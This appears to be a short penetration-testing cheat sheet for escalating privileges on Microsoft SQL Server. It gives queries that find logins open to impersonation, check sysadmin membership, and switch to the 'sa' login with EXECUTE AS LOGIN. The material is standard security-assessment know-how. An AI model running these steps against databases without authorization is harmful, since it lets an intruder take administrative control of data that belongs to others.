-- -
You can impersonate other users on the db depending on the permissions your user has. For example, a sysadmin could impersonate anyone in the db.
### Identify Users We Can Impersonate
```mysql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```
### Verify Current User & Role
```mysql
# if output is 1, you have sysadmin privs
# if output is 0, you don't have sysadmin privs, but you may be able to impersonate a user that does. 
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
### Impersonate another user
```mysql
EXECUTE AS LOGIN = '<user>'
EXECUTE AS LOGIN = 'sa'

# revert back
REVERT
```